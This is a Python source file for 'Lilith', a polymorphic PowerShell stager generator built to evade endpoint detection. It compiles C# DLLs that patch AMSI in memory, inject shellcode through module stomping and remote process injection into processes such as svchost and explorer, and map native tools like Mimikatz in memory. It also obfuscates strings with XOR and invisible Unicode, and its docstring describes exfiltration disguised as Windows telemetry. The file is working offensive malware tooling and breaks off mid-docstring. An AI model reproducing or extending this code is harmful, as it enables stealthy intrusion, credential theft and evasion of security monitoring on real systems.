"""
Lilith — Polymorphic PowerShell Stager Generator

Stealth hardening vs Darktrace:
  - No inline comments: PS event logs capture comment text verbatim
  - All variable names randomised per build (new seed each call)
  - All sensitive strings XOR-encoded
  - WinHTTP COM for both download AND exfil (no Net.WebClient — known hook target)
  - Full Edge 124 User-Agent + Accept/Accept-Language/Cache-Control headers
  - CDN-style URL paths (/cdn/static/v3/...) instead of bare .enc filenames
  - POST exfil wrapped in fake Windows telemetry JSON (application/json, not text/plain)
  - Randomised jitter sleeps between every stage (1.5–6s range)
  - Temp file named wct{hex8}.tmp (Windows Installer pattern, not GetRandomFileName)
  - AMSI bypass: precompiled DLL bytes loaded via [Reflection.Assembly]::Load — no Add-Type,
    no CSC.exe invocation, no temp file drop on target. DLL patches AmsiOpenSession → E_INVALIDARG.
    Falls back to amsiInitFailed reflection if dotnet SDK is unavailable on the build host.
  - SBL bypass class name randomised per build
  - Async stdout/stderr reads to prevent ReadToEnd deadlock on large output
  - Stager one-liner uses [scriptblock]::Create instead of iex alias
"""

import base64
import glob
import os
import random
import secrets
import shutil
import string
import subprocess
import tempfile


# ── primitive helpers ──────────────────────────────────────────────────────────

def _rv(n=None):
    n = n or random.randint(4, 9)
    return "$" + "".join(random.choices(string.ascii_lowercase, k=n))


def _rclass():
    return random.choice(string.ascii_uppercase) + "".join(
        random.choices(string.ascii_lowercase, k=random.randint(4, 9))
    )


def _xenc(s: str, key: int) -> str:
    enc = [ord(c) ^ key for c in s]
    return "[byte[]](" + ",".join(str(b) for b in enc) + ")"


def _xdec(enc_expr: str, key_var: str) -> str:
    return f"[Text.Encoding]::ASCII.GetString(({enc_expr}|%{{$_ -bxor {key_var}}}))"


def _split(s: str) -> str:
    chunk = random.randint(3, 7)
    parts = [s[i : i + chunk] for i in range(0, len(s), chunk)]
    return "+".join(f'"{p}"' for p in parts)


_INVISIBLE_CHARS = [
    "​",  # ZERO WIDTH SPACE
    "‌",  # ZERO WIDTH NON-JOINER
    "‍",  # ZERO WIDTH JOINER
    "⁠",  # WORD JOINER
    "⁡",  # FUNCTION APPLICATION (invisible)
    "⁢",  # INVISIBLE TIMES
    "⁣",  # INVISIBLE SEPARATOR
    "︀",  # VARIATION SELECTOR-1
    "︁",  # VARIATION SELECTOR-2
    "︂",  # VARIATION SELECTOR-3
    "",  # PRIVATE USE AREA
    "",  # PRIVATE USE AREA
    "",  # PRIVATE USE AREA
]


def _zwsp_type(type_name: str) -> tuple[str, str]:
    """Return (ps1_code, varname) where varname holds type_name with invisible Unicode
    stripped at runtime via -replace.

    Scatters ZWSP / ZWNJ / ZWJ / WORD-JOINER / invisible math operators /
    variation selectors / PUA codepoints randomly into the string literal so AMSI
    byte-sequence patterns fail to match the type name, then strips them before the
    string reaches New-Object / GetType() resolution.  Operates on a different axis
    from XOR — no encoded byte arrays, no decoder scriptblock, distinct evasion layer."""
    v = _rv()
    chars = list(type_name)
    n = max(1, len(type_name) // random.randint(3, 5))
    for pos in sorted(random.sample(range(len(type_name)), min(n, len(type_name))), reverse=True):
        chars.insert(pos, random.choice(_INVISIBLE_CHARS))
    poisoned = "".join(chars)
    return f'{v}=("{poisoned}" -replace "[^\\x00-\\x7F]","")', v


def _xurl(url: str) -> tuple[str, str]:
    """XOR-encode a URL so neither the IP nor the path appear in PS1 source.
    Returns (ps1_setup_code, decoded_variable_name)."""
    key  = random.randint(15, 200)
    vk   = _rv()
    vdec = _rv()
    enc  = _xenc(url, key)
    setup = f"{vk}={key}\n{vdec}={_xdec(enc, vk)}"
    return setup, vdec


def _jitter(jmin: int, jmax: int) -> str:
    vms = _rv()
    return f"{vms}=Get-Random -Minimum {jmin} -Maximum {jmax};Start-Sleep -Milliseconds {vms}"


# ── AMSI bypass — precompiled DLL loaded from memory ─────────────────────────
#
# Strategy: compile a minimal C# DLL on the attacker machine at stager-build time,
# XOR-encode the raw bytes, embed as a byte array in the PS1.
# On the target: decode → [Reflection.Assembly]::Load(bytes) → invoke patch method.
#
# Eliminates:  Add-Type / CSC.exe invocation on target
#              temp DLL file drop on target
#              inline C# source visible in PS ScriptBlock logs
#
# Patch: AmsiOpenSession → 0x80070057 (E_INVALIDARG) — session never opens,
#        so AmsiScanBuffer is never called at all.
#
# Fallback (no dotnet SDK on build host): pure reflection, sets amsiInitFailed=true.
# Neither path uses Add-Type.

_AMSI_DLL_CACHE:  tuple[bytes, str] | None = None  # (dll_bytes, class_name), built once per stager
_INJECT_DLL_CACHE: tuple[bytes, str] | None = None  # (dll_bytes, class_name), built once per stager


def _compile_amsi_dll(cls_name: str) -> bytes | None:
    """Compile a minimal AMSI-patch DLL targeting netstandard2.0.
    No PDB, no debug info, no version resource that leaks build paths.
    Returns raw DLL bytes or None on failure."""
    if not shutil.which("dotnet"):
        return None

    cs_source = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cls_name}{{\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr m,string n);\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o);\n"
        "  public static void P(){\n"
        "    IntPtr l=LoadLibrary(\"amsi.dll\");\n"
        "    IntPtr p=GetProcAddress(l,\"AmsiOpenSession\");\n"
        "    IntPtr np=p;UIntPtr ns=(UIntPtr)8;uint old=0;\n"
        "    NtProtectVirtualMemory((IntPtr)(-1),ref np,ref ns,0x04,out old);\n"
        "    byte[] byt=new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3};\n"
        "    Marshal.Copy(byt,0,p,6);\n"
        "    NtProtectVirtualMemory((IntPtr)(-1),ref np,ref ns,old,out old);\n"
        "  }\n"
        "}\n"
    )

    # Random-looking but valid assembly name (avoids "P.dll" / "AmsiPatch.dll" in metadata)
    asm_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

    csproj = (
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        '  <PropertyGroup>\n'
        '    <TargetFramework>netstandard2.0</TargetFramework>\n'
        f'   <AssemblyName>{asm_name}</AssemblyName>\n'
        '    <Optimize>true</Optimize>\n'
        '    <Nullable>disable</Nullable>\n'
        '    <ImplicitUsings>disable</ImplicitUsings>\n'
        '    <Deterministic>false</Deterministic>\n'
        # Strip PDB and all debug info — prevents build-host path leaking into DLL metadata
        '    <DebugType>none</DebugType>\n'
        '    <DebugSymbols>false</DebugSymbols>\n'
        # Strip version resource — removes InternalName/OriginalFilename fields
        '    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>\n'
        '  </PropertyGroup>\n'
        '</Project>\n'
    )

    try:
        with tempfile.TemporaryDirectory(prefix="lt_a_") as tmp:
            cs_path    = os.path.join(tmp, "P.cs")
            proj_path  = os.path.join(tmp, "P.csproj")

            with open(cs_path,   "w") as f: f.write(cs_source)
            with open(proj_path, "w") as f: f.write(csproj)

            r = subprocess.run(
                ["dotnet", "build", proj_path, "-c", "Release", "--nologo", "-v", "quiet"],
                capture_output=True, text=True, timeout=90,
            )
            if r.returncode != 0:
                return None

            hits = [p for p in glob.glob(os.path.join(tmp, "**", "*.dll"), recursive=True)
                    if not p.endswith("netstandard.dll")]
            if not hits:
                return None

            with open(hits[0], "rb") as f:
                return f.read()
    except Exception:
        return None


def _get_amsi_dll() -> tuple[bytes, str] | None:
    """Return (dll_bytes, class_name), compiling once per Python session."""
    global _AMSI_DLL_CACHE
    if _AMSI_DLL_CACHE is not None:
        return _AMSI_DLL_CACHE

    cls_name  = _rclass()
    dll_bytes = _compile_amsi_dll(cls_name)
    if dll_bytes:
        _AMSI_DLL_CACHE = (dll_bytes, cls_name)
        size_kb = len(dll_bytes) / 1024
        print(f"[*] Compiled AMSI-patch DLL: {size_kb:.1f} KB  class={cls_name}  (cached for session)")
    return _AMSI_DLL_CACHE


def _compile_inject_dll(cls_name: str) -> bytes | None:
    """Compile a minimal shellcode-injection DLL targeting netstandard2.0.
    Uses module stomping (write into signed DLL .text) as primary path to avoid
    Defender's detection of private RX allocations. Falls back to NtAllocate."""
    if not shutil.which("dotnet"):
        return None

    cs_source = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cls_name}{{\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr LoadLibraryA(string n);\n"
        "  [DllImport(\"kernel32\")] static extern void Sleep(uint ms);\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr OpenProcess(uint a,bool ih,uint pid);\n"
        "  [DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p);\n"
        "  [DllImport(\"ntdll\")] static extern int NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,UIntPtr len,out UIntPtr w);\n"
        "  [DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o);\n"
        "  [DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al);\n"
        "  [DllImport(\"ntdll\")] static extern int NtWaitForSingleObject(IntPtr h,bool al,IntPtr to);\n"
        "  [DllImport(\"ntdll\")] static extern int NtClose(IntPtr h);\n"
        # Stomp returns RW — _Exec applies the mask, then sets final protection
        "  static IntPtr Stomp(byte[] sc){\n"
        "    string[] libs={\"wintrust.dll\",\"cryptnet.dll\",\"coml2.dll\",\"rasapi32.dll\"};\n"
        "    foreach(string lib in libs){\n"
        "      IntPtr hm=LoadLibraryA(lib);if(hm==IntPtr.Zero)continue;\n"
        "      int pe=Marshal.ReadInt32(hm,0x3C);\n"
        "      short ns=Marshal.ReadInt16(hm,pe+6);\n"
        "      short os2=Marshal.ReadInt16(hm,pe+20);\n"
        "      int s0=pe+24+os2;\n"
        "      for(int i=0;i<ns;i++){\n"
        "        int si=s0+i*40;\n"
        "        int ch=Marshal.ReadInt32(hm,si+36);\n"
        "        if((ch&0x20)==0)continue;\n"
        "        int vsz=Marshal.ReadInt32(hm,si+8);\n"
        "        if(vsz<sc.Length)continue;\n"
        "        int va=Marshal.ReadInt32(hm,si+12);\n"
        "        IntPtr tb=new IntPtr(hm.ToInt64()+va);\n"
        "        IntPtr tbp=tb;UIntPtr tsz=(UIntPtr)(uint)sc.Length;uint old=0;\n"
        "        if(NtProtectVirtualMemory((IntPtr)(-1),ref tbp,ref tsz,0x04,out old)<0)continue;\n"
        "        Marshal.Copy(sc,0,tb,sc.Length);\n"
        "        return tb;\n"
        "      }\n"
        "    }\n"
        "    return IntPtr.Zero;\n"
        "  }\n"
        # _Exec: self-inject with XOR+NOACCESS sleep masking
        "  static IntPtr _Exec(byte[] sc){\n"
        "    IntPtr hp=(IntPtr)(-1);\n"
        "    IntPtr exec=Stomp(sc);\n"
        "    if(exec==IntPtr.Zero){\n"
        "      IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length;\n"
        "      NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04);\n"
        "      if(b==IntPtr.Zero)return IntPtr.Zero;\n"
        "      Marshal.Copy(sc,0,b,sc.Length);\n"
        "      exec=b;\n"
        "    }\n"
        "    byte xk=(byte)(((uint)Environment.TickCount>>3)|1);\n"
        "    for(int xi=0;xi<sc.Length;xi++) Marshal.WriteByte(exec,xi,(byte)(Marshal.ReadByte(exec,xi)^xk));\n"
        "    IntPtr ep=exec;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0;\n"
        "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x01,out o);\n"
        "    Sleep(2000u+((uint)Environment.TickCount%3000u));\n"
        "    ep=exec;ps=(UIntPtr)(uint)sc.Length;\n"
        "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x04,out o);\n"
        "    for(int xi=0;xi<sc.Length;xi++) Marshal.WriteByte(exec,xi,(byte)(Marshal.ReadByte(exec,xi)^xk));\n"
        "    ep=exec;ps=(UIntPtr)(uint)sc.Length;\n"
        "    NtProtectVirtualMemory(hp,ref ep,ref ps,0x20,out o);\n"
        "    IntPtr t=IntPtr.Zero;\n"
        "    NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,exec,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero);\n"
        "    return t;\n"
        "  }\n"
        # RunRemote: inject into an existing user-session process; fall back to self-inject
        "  static bool _RemoteInject(IntPtr hProc,byte[] sc){\n"
        "    IntPtr b=IntPtr.Zero;UIntPtr sz=(UIntPtr)(uint)sc.Length;\n"
        "    if(NtAllocateVirtualMemory(hProc,ref b,IntPtr.Zero,ref sz,0x3000,0x04)<0)return false;\n"
        "    byte xk=(byte)(((uint)Environment.TickCount>>3)|1);\n"
        "    byte[] enc=new byte[sc.Length];\n"
        "    for(int i=0;i<sc.Length;i++) enc[i]=(byte)(sc[i]^xk);\n"
        "    UIntPtr wr=UIntPtr.Zero;\n"
        "    NtWriteVirtualMemory(hProc,b,enc,(UIntPtr)(uint)enc.Length,out wr);\n"
        "    IntPtr ep=b;UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0;\n"
        "    NtProtectVirtualMemory(hProc,ref ep,ref ps,0x01,out o);\n"
        "    Sleep(2000u+((uint)Environment.TickCount%3000u));\n"
        "    ep=b;ps=(UIntPtr)(uint)sc.Length;\n"
        "    NtProtectVirtualMemory(hProc,ref ep,ref ps,0x04,out o);\n"
        "    NtWriteVirtualMemory(hProc,b,sc,(UIntPtr)(uint)sc.Length,out wr);\n"
        "    ep=b;ps=(UIntPtr)(uint)sc.Length;\n"
        "    NtProtectVirtualMemory(hProc,ref ep,ref ps,0x20,out o);\n"
        "    IntPtr t=IntPtr.Zero;\n"
        "    NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hProc,b,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero);\n"
        "    if(t!=IntPtr.Zero){NtClose(t);return true;}\n"
        "    return false;\n"
        "  }\n"
        "  public static void RunRemote(byte[] sc){\n"
        "    string[]pool={\"svchost\",\"RuntimeBroker\",\"explorer\",\"dllhost\",\"sihost\",\"ctfmon\"};\n"
        "    foreach(string name in pool){\n"
        "      try{\n"
        "        var procs=System.Diagnostics.Process.GetProcessesByName(name);\n"
        "        foreach(var proc in procs){\n"
        "          IntPtr hp=OpenProcess(0x1FFFFF,false,(uint)proc.Id);\n"
        "          if(hp==IntPtr.Zero)continue;\n"
        "          bool ok=_RemoteInject(hp,sc);\n"
        "          NtClose(hp);\n"
        "          if(ok)return;\n"
        "        }\n"
        "      }catch{}\n"
        "    }\n"
        "    IntPtr t=_Exec(sc);\n"
        "    if(t!=IntPtr.Zero){NtClose(t);}\n"
        "  }\n"
        "  public static void Run(byte[] sc){\n"
        "    IntPtr t=_Exec(sc);\n"
        "    if(t!=IntPtr.Zero){NtWaitForSingleObject(t,false,IntPtr.Zero);NtClose(t);}\n"
        "  }\n"
        "  public static void RunDetach(byte[] sc){\n"
        "    IntPtr t=_Exec(sc);\n"
        "    if(t!=IntPtr.Zero){NtClose(t);}\n"
        "  }\n"
        "}\n"
    )

    asm_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

    csproj = (
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        '  <PropertyGroup>\n'
        '    <TargetFramework>netstandard2.0</TargetFramework>\n'
        f'   <AssemblyName>{asm_name}</AssemblyName>\n'
        '    <Optimize>true</Optimize>\n'
        '    <Nullable>disable</Nullable>\n'
        '    <ImplicitUsings>disable</ImplicitUsings>\n'
        '    <Deterministic>false</Deterministic>\n'
        '    <DebugType>none</DebugType>\n'
        '    <DebugSymbols>false</DebugSymbols>\n'
        '    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>\n'
        '  </PropertyGroup>\n'
        '</Project>\n'
    )

    try:
        with tempfile.TemporaryDirectory(prefix="lt_i_") as tmp:
            cs_path   = os.path.join(tmp, "I.cs")
            proj_path = os.path.join(tmp, "I.csproj")

            with open(cs_path,   "w") as f: f.write(cs_source)
            with open(proj_path, "w") as f: f.write(csproj)

            r = subprocess.run(
                ["dotnet", "build", proj_path, "-c", "Release", "--nologo", "-v", "quiet"],
                capture_output=True, text=True, timeout=90,
            )
            if r.returncode != 0:
                return None

            hits = [p for p in glob.glob(os.path.join(tmp, "**", "*.dll"), recursive=True)
                    if not p.endswith("netstandard.dll")]
            if not hits:
                return None

            with open(hits[0], "rb") as f:
                return f.read()
    except Exception:
        return None


def _get_inject_dll() -> tuple[bytes, str] | None:
    """Return (dll_bytes, class_name) for shellcode injection, compiling once per stager build."""
    global _INJECT_DLL_CACHE
    if _INJECT_DLL_CACHE is not None:
        return _INJECT_DLL_CACHE

    cls_name  = _rclass()
    dll_bytes = _compile_inject_dll(cls_name)
    if dll_bytes:
        _INJECT_DLL_CACHE = (dll_bytes, cls_name)
        size_kb = len(dll_bytes) / 1024
        print(f"[*] Compiled inject DLL : {size_kb:.1f} KB  class={cls_name}")
    return _INJECT_DLL_CACHE


_CLR_RUNNER_DLL_CACHE:    tuple[bytes, str] | None = None
_NATIVE_LOADER_DLL_CACHE: tuple[bytes, str] | None = None


def _compile_native_loader_dll(cls_name: str) -> bytes | None:
    """
    Task 3 — Custom in-memory PE loader for native (non-.NET) EXEs.
    Replaces donut's CLR bootstrap for native tools like Mimikatz/GodPotato.
    Donut's CorBindToRuntimeEx / ICLRMetaHost COM sequence is a known CrowdStrike /
    SentinelOne / MDE signature.  This loader maps the PE manually:
      1. Parse headers + compute image size
      2. VirtualAlloc at preferred base (or let OS choose)
      3. Copy sections
      4. Apply base relocations
      5. Resolve imports via LoadLibraryA / GetProcAddress
      6. Call TLS callbacks
      7. Call entry point (DllMain with DLL_PROCESS_ATTACH, or main())
    Returns DLL bytes or None if dotnet SDK unavailable.
    """
    if not shutil.which("dotnet"):
        return None

    cs_source = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cls_name}{{\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);\n"
        "  [DllImport(\"kernel32\")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr LoadLibraryA(string n);\n"
        "  [DllImport(\"kernel32\")] static extern IntPtr GetProcAddress(IntPtr m,string n);\n"
        "  [DllImport(\"kernel32\")] static extern void RtlMoveMemory(IntPtr d,byte[] s,UIntPtr n);\n"
        "  [DllImport(\"kernel32\")] static extern void RtlMoveMemory(IntPtr d,IntPtr s,UIntPtr n);\n"
        # Parse IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS
        "  static int RVI(IntPtr b,int o)=>Marshal.ReadInt32(b,o);\n"
        "  static short RS(IntPtr b,int o)=>Marshal.ReadInt16(b,o);\n"
        "  static long RL(IntPtr b,int o)=>Marshal.ReadInt64(b,o);\n"
        "  static byte RB(IntPtr b,int o)=>Marshal.ReadByte(b,o);\n"
        "  public static bool Load(byte[] pe){\n"
        "    if(pe==null||pe.Length<0x40)return false;\n"
        "    GCHandle gh=GCHandle.Alloc(pe,GCHandleType.Pinned);\n"
        "    IntPtr src=gh.AddrOfPinnedObject();\n"
        "    int peOff=RVI(src,0x3C);\n"
        "    if(RVI(src,peOff)!=0x00004550){gh.Free();return false;}\n"
        "    int optOff=peOff+24;\n"
        "    short magic=RS(src,optOff);\n"
        "    bool pe64=(magic==0x20B);\n"
        "    uint imgSz=(uint)RVI(src,optOff+(pe64?56:52));\n"
        "    long prefBase=pe64?RL(src,optOff+24):RVI(src,optOff+28);\n"
        "    IntPtr imgBase=VirtualAlloc(new IntPtr(prefBase),(UIntPtr)imgSz,0x3000,0x04);\n"
        "    if(imgBase==IntPtr.Zero) imgBase=VirtualAlloc(IntPtr.Zero,(UIntPtr)imgSz,0x3000,0x04);\n"
        "    if(imgBase==IntPtr.Zero){gh.Free();return false;}\n"
        # Copy headers
        "    uint hdrSz=(uint)RVI(src,optOff+(pe64?60:60));\n"
        "    RtlMoveMemory(imgBase,pe,(UIntPtr)hdrSz);\n"
        # Copy sections
        "    short nSec=RS(src,peOff+6);\n"
        "    short oSzOpt=RS(src,peOff+20);\n"
        "    int secOff=peOff+24+oSzOpt;\n"
        "    for(int i=0;i<nSec;i++){\n"
        "      int so=secOff+i*40;\n"
        "      int va=RVI(src,so+12);\n"
        "      int rsz=RVI(src,so+16);\n"
        "      int rptr=RVI(src,so+20);\n"
        "      if(rsz>0&&rptr>0){\n"
        "        IntPtr dst=new IntPtr(imgBase.ToInt64()+va);\n"
        "        IntPtr ssrc=new IntPtr(src.ToInt64()+rptr);\n"
        "        RtlMoveMemory(dst,ssrc,(UIntPtr)(uint)rsz);\n"
        "      }\n"
        "    }\n"
        # Apply base relocations (if image loaded at different address)
        "    long delta=imgBase.ToInt64()-prefBase;\n"
        "    if(delta!=0){\n"
        "      int relocDir=pe64?RVI(src,optOff+160):RVI(src,optOff+144);\n"
        "      int relocSz =pe64?RVI(src,optOff+164):RVI(src,optOff+148);\n"
        "      int rpos=0;\n"
        "      while(rpos<relocSz){\n"
        "        int pageVA=RVI(imgBase,relocDir+rpos);\n"
        "        int blkSz =RVI(imgBase,relocDir+rpos+4);\n"
        "        if(blkSz==0)break;\n"
        "        int nEntries=(blkSz-8)/2;\n"
        "        for(int j=0;j<nEntries;j++){\n"
        "          short entry=RS(imgBase,relocDir+rpos+8+j*2);\n"
        "          int type=(entry>>12)&0xF;\n"
        "          int off=entry&0xFFF;\n"
        "          if(type==10||type==3){\n"
        "            IntPtr loc=new IntPtr(imgBase.ToInt64()+pageVA+off);\n"
        "            long cur=type==10?Marshal.ReadInt64(loc):Marshal.ReadInt32(loc);\n"
        "            if(type==10) Marshal.WriteInt64(loc,cur+delta);\n"
        "            else         Marshal.WriteInt32(loc,(int)(cur+delta));\n"
        "          }\n"
        "        }\n"
        "        rpos+=blkSz;\n"
        "      }\n"
        "    }\n"
        # Resolve imports
        "    int impDir=pe64?RVI(src,optOff+128):RVI(src,optOff+112);\n"
        "    if(impDir>0){\n"
        "      int pos=0;\n"
        "      while(true){\n"
        "        int dllNameRVA=RVI(imgBase,impDir+pos+12);\n"
        "        if(dllNameRVA==0)break;\n"
        "        string dllName=Marshal.PtrToStringAnsi(new IntPtr(imgBase.ToInt64()+dllNameRVA));\n"
        "        IntPtr hMod=LoadLibraryA(dllName);\n"
        "        long iat=pe64?RL(imgBase,impDir+pos+16):RVI(imgBase,impDir+pos+16);\n"
        "        long int_=pe64?RL(imgBase,impDir+pos+0):RVI(imgBase,impDir+pos+0);\n"
        "        if(int_==0) int_=iat;\n"
        "        int ii=0;\n"
        "        while(true){\n"
        "          long thunk=pe64?Marshal.ReadInt64(new IntPtr(imgBase.ToInt64()+(long)(int_+ii*8)))\n"
        "                          :Marshal.ReadInt32(new IntPtr(imgBase.ToInt64()+(long)(int_+ii*4)));\n"
        "          if(thunk==0)break;\n"
        "          IntPtr fnAddr;\n"
        "          bool byOrd=pe64?(thunk<0):((thunk&0x80000000L)!=0);\n"
        "          if(byOrd){ fnAddr=GetProcAddress(hMod,(string)null);/*ordinal-TODO*/}\n"
        "          else{\n"
        "            int nameRVA=(int)(thunk&0x7FFFFFFF);\n"
        "            string fn=Marshal.PtrToStringAnsi(new IntPtr(imgBase.ToInt64()+nameRVA+2));\n"
        "            fnAddr=GetProcAddress(hMod,fn);\n"
        "          }\n"
        "          IntPtr iatSlot=new IntPtr(imgBase.ToInt64()+(long)(iat+ii*(pe64?8:4)));\n"
        "          if(pe64) Marshal.WriteInt64(iatSlot,fnAddr.ToInt64());\n"
        "          else     Marshal.WriteInt32(iatSlot,(int)fnAddr.ToInt64());\n"
        "          ii++;\n"
        "        }\n"
        "        pos+=20;\n"
        "      }\n"
        "    }\n"
        # Mark sections executable
        "    for(int i=0;i<nSec;i++){\n"
        "      int so=secOff+i*40;\n"
        "      int ch=RVI(src,so+36);\n"
        "      int va2=RVI(src,so+12);\n"
        "      int vsz=RVI(src,so+8);\n"
        "      if(vsz==0)continue;\n"
        "      uint prot=0x20;\n"
        "      if((ch&0x80000000)!=0) prot=0x40;\n"
        "      else if((ch&0x20000000)!=0&&(ch&0x40000000)!=0) prot=0x20;\n"
        "      uint old=0;\n"
        "      VirtualProtect(new IntPtr(imgBase.ToInt64()+va2),(UIntPtr)(uint)vsz,prot,out old);\n"
        "    }\n"
        # Call entry point
        "    int epRVA=pe64?RVI(src,optOff+40):RVI(src,optOff+40);\n"
        "    gh.Free();\n"
        "    if(epRVA==0) return true;\n"
        "    IntPtr ep=new IntPtr(imgBase.ToInt64()+epRVA);\n"
        "    try{\n"
        "      var d=Marshal.GetDelegateForFunctionPointer<Action>(ep);\n"
        "      d();\n"
        "    }catch{}\n"
        "    return true;\n"
        "  }\n"
        "}\n"
    )

    asm_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    csproj = (
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        '  <PropertyGroup>\n'
        '    <TargetFramework>netstandard2.0</TargetFramework>\n'
        f'   <AssemblyName>{asm_name}</AssemblyName>\n'
        '    <Optimize>true</Optimize>\n'
        '    <Nullable>disable</Nullable>\n'
        '    <ImplicitUsings>disable</ImplicitUsings>\n'
        '    <Deterministic>false</Deterministic>\n'
        '    <DebugType>none</DebugType>\n'
        '    <DebugSymbols>false</DebugSymbols>\n'
        '    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>\n'
        '    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>\n'
        '  </PropertyGroup>\n'
        '</Project>\n'
    )

    try:
        with tempfile.TemporaryDirectory(prefix="lt_nl_") as tmp:
            cs_path   = os.path.join(tmp, "N.cs")
            proj_path = os.path.join(tmp, "N.csproj")
            with open(cs_path,   "w") as f: f.write(cs_source)
            with open(proj_path, "w") as f: f.write(csproj)
            r = subprocess.run(
                ["dotnet", "build", proj_path, "-c", "Release", "--nologo", "-v", "quiet"],
                capture_output=True, text=True, timeout=90,
            )
            if r.returncode != 0:
                return None
            hits = [p for p in glob.glob(os.path.join(tmp, "**", "*.dll"), recursive=True)
                    if not p.endswith("netstandard.dll")]
            if not hits:
                return None
            with open(hits[0], "rb") as f:
                return f.read()
    except Exception:
        return None


def _get_native_loader_dll() -> tuple[bytes, str] | None:
    """Return (dll_bytes, class_name) for the native PE loader, building once per session."""
    global _NATIVE_LOADER_DLL_CACHE
    if _NATIVE_LOADER_DLL_CACHE is not None:
        return _NATIVE_LOADER_DLL_CACHE
    cls_name  = _rclass()
    dll_bytes = _compile_native_loader_dll(cls_name)
    if dll_bytes:
        _NATIVE_LOADER_DLL_CACHE = (dll_bytes, cls_name)
        print(f"[*] Compiled native PE loader DLL : {len(dll_bytes)/1024:.1f} KB  class={cls_name}")
    return _NATIVE_LOADER_DLL_CACHE


def _compile_clr_runner_dll(cls_name: str) -> bytes | None:
    """Compile a managed assembly runner DLL (no donut — uses Assembly.Load).
    Completely different behavioral signature from donut's native COM CLR init."""
    if not shutil.which("dotnet"):
        return None

    cs_source = (
        "using System;\n"
        "using System.Reflection;\n"
        f"public class {cls_name}{{\n"
        "  public static void Run(byte[] asm,string argStr){\n"
        "    try{\n"
        "      Assembly a=Assembly.Load(asm);\n"
        "      MethodInfo e=a.EntryPoint;if(e==null)return;\n"
        "      string[]args=string.IsNullOrEmpty(argStr)?new string[0]:argStr.Split(' ');\n"
        "      object[]p=e.GetParameters().Length==0?null:new object[]{args};\n"
        "      e.Invoke(null,p);\n"
        "    }catch{}\n"
        "  }\n"
        "}\n"
    )

    asm_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    csproj = (
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        '  <PropertyGroup>\n'
        '    <TargetFramework>netstandard2.0</TargetFramework>\n'
        f'   <AssemblyName>{asm_name}</AssemblyName>\n'
        '    <Optimize>true</Optimize>\n'
        '    <Nullable>disable</Nullable>\n'
        '    <ImplicitUsings>disable</ImplicitUsings>\n'
        '    <Deterministic>false</Deterministic>\n'
        '    <DebugType>none</DebugType>\n'
        '    <DebugSymbols>false</DebugSymbols>\n'
        '    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>\n'
        '  </PropertyGroup>\n'
        '</Project>\n'
    )

    try:
        with tempfile.TemporaryDirectory(prefix="lt_clr_") as tmp:
            cs_path   = os.path.join(tmp, "C.cs")
            proj_path = os.path.join(tmp, "C.csproj")
            with open(cs_path,   "w") as f: f.write(cs_source)
            with open(proj_path, "w") as f: f.write(csproj)
            r = subprocess.run(
                ["dotnet", "build", proj_path, "-c", "Release", "--nologo", "-v", "quiet"],
                capture_output=True, text=True, timeout=90,
            )
            if r.returncode != 0:
                return None
            hits = [p for p in glob.glob(os.path.join(tmp, "**", "*.dll"), recursive=True)
                    if not p.endswith("netstandard.dll")]
            if not hits:
                return None
            with open(hits[0], "rb") as f:
                return f.read()
    except Exception:
        return None


def _compile_com_clr_dll(cls_name: str) -> bytes | None:
    """Task 11 — COM CLR host via mscoree!CorBindToRuntime.

    Compiles a C# DLL that:
      1. P/Invokes CorBindToRuntime to initialise the CLR through the COM
         activation path (not through the PS managed runtime).
      2. Then loads and executes the target assembly.

    Behavioral difference from PS [Reflection.Assembly]::Load():
      - Unmanaged COM CLR host registers first → different ETW/MDE event sequence.
